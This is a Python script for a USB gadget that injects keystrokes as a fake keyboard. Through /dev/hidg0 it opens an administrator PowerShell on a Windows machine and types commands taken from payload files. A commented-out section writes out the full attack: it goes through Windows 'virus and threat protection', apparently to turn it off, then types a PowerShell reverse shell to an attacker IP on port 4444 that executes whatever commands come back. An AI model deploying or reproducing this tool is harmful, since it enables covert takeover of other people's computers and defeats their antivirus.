#!/usr/bin/env python3
NULL_CHAR = chr(0)
import time
def write_report(report):
    with open('/dev/hidg0', 'rb+') as fd:
        fd.write(report.encode())

attacker_ip = '192.168.1.81'

lib_lower = {
        'a': 4,
        'b': 5,
        'c': 6,
        'd': 7,
        'e': 8,
        'f': 9,
        'g': 10,
        'h': 11,
        'i': 12,
        'j': 13,
        'k': 14,
        'l': 15,
        'm': 16,
        'n': 17,
        'o': 18,
        'p': 19,
        'q': 20,
        'r': 21,
        's': 22,
        't': 23,
        'u': 24,
        'v': 25,
        'w': 26,
        'x': 27,
        'y': 28,
        'z': 29,
        '-': 45,
        '=': 46,
        '[': 47,
        ']': 48,
        '\\': 100,
        ';': 51,
        "'": 52,
        ',': 54,
        '.': 55,
        '/': 56,
        '1': 30,
        '2': 31,
        '3': 32,
        '4': 33,
        '5': 34,
        '6': 35,
        '7': 36,
        '8': 37,
        '9': 38,
        '0': 39,
        '`': 53,
        '\n': 40,
        '\t': 43,
        ' ': 44
}

lib_upper = {
        'A': 4,
        'B': 5,
        'C': 6,
        'D': 7,
        'E': 8,
        'F': 9,
        'G': 10,
        'H': 11,
        'I': 12,
        'J': 13,
        'K': 14,
        'L': 15,
        'M': 16,
        'N': 17,
        'O': 18,
        'P': 19,
        'Q': 20,
        'R': 21,
        'S': 22,
        'T': 23,
        'U': 24,
        'V': 25,
        'W': 26,
        'X': 27,
        'Y': 28,
        'Z': 29,
        '_': 45,
        '+': 46,
        '{': 47,
        '}': 48,
        '|': 49,
        ':': 51,
        '"': 31,
        '?': 56,
        '!': 30,
        '@': 52,
        '#': 50,
        '$': 33,
        '%': 34,
        '^': 35,
        '&': 36,
        '*': 37,
        '(': 38,
        ')': 39,
        '~': 53
} 

def send(key):
    if key in lib_lower:
        write_report(NULL_CHAR*2 + chr(lib_lower[key]) + NULL_CHAR*5)
        write_report(NULL_CHAR*8)
    elif key in lib_upper:
        write_report(chr(32) + NULL_CHAR + chr(lib_upper[key]) + NULL_CHAR*5)
        write_report(NULL_CHAR*8)
    elif key == '>':
        write_report(chr(32) + NULL_CHAR + chr(55) + NULL_CHAR*5)
        write_report(NULL_CHAR*8)
    elif key == '<':
        write_report(chr(32) + NULL_CHAR + chr(54) + NULL_CHAR*5)
        write_report(NULL_CHAR*8)

    write_report(NULL_CHAR*8)

def open_powershell():
    # open runbox
    write_report(NULL_CHAR*8)
    write_report(chr(8) + NULL_CHAR + chr(21) + NULL_CHAR*5)
    write_report(NULL_CHAR*8)
    time.sleep(0.5)

    for i in "powershell":
        print(i)
        time.sleep(0.05)
        send(i)

    time.sleep(0.5)
    # press control shift enter
    write_report(chr(48) + NULL_CHAR + chr(40) + NULL_CHAR*5)

    time.sleep(0.5)
    write_report(NULL_CHAR*8)


def windows_key():
    write_report(chr(8)+NULL_CHAR*7)
    write_report(NULL_CHAR*8)
    time.sleep(0.5)

def arrow_key(left):
    time.sleep(1)
    if left is True:
        write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
    else:
        write_report(NULL_CHAR*2 + chr(79) + NULL_CHAR*5)
    time.sleep(1)
    write_report(NULL_CHAR*8)

def send_reverse_payload():
    lines = open('reverse_shell_payload.txt', 'r')
    l = lines.readlines()
    print(l)
    for i in l[0]:
        send(i)

payload = open('payload.txt', 'r')
lines = payload.readlines()
for l in lines:
    write_report(NULL_CHAR*8)
    time.sleep(0.5)
    l = l.rstrip("\n")

    line = l.split(" ")
    print("here")
    print(l)
    if line[0] == 'string':
        for i in l[6:len(l)]:
            send(i)
    elif line[0] == 'enter':
        send('\n')
    elif line[0] == 'tab':
        time.sleep(0.5)
        send('\t')
    elif line[0] == 'space':
        send(' ')
    elif line[0] == 'admin_powershell':
        open_powershell()
    elif line[0] == 'win_key':
        windows_key()
    elif line[0] == 'payload':
        send_reverse_payload()
    elif line[0] == 'left_arrow':
        arrow_key(True)
    elif line[0] == 'right_arrow':
        arrow_key(False)

"""
def enter():
    time.sleep(0.5)
    write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
    write_report(NULL_CHAR*8)
    time.sleep(0.5)
for i in "virus and threat protection":
    print(i)
    time.sleep(0.05)
    send(i)

send('\n')

for j in range(0,4):
    send('\t')

send('\n')
# hit space 
send(' ')

time.sleep(1)
# left arrow
write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)

time.sleep(1)
write_report(NULL_CHAR*8)
time.sleep(0.5)


send('\n')

open_powershell()

write_report(NULL_CHAR*8)
time.sleep(1)
# left arrow
write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)

time.sleep(1)
write_report(NULL_CHAR*8)
time.sleep(0.5)


send('\n')

time.sleep(0.5)
# press enter
send('\n')
time.sleep(0.5)



for i in "$client = New-Object System.Net.Sockets.TCPClient(" + "'" + attacker_ip + "'" + ",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()":
    send(i)

time.sleep(0.5)

# press enter
send('\n')

write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
write_report(NULL_CHAR*8)
time.sleep(0.5)
write_report(chr(4) + NULL_CHAR + chr(61) + NULL_CHAR*5)
write_report(NULL_CHAR*8)
"""
# release all keys
write_report(NULL_CHAR*8)

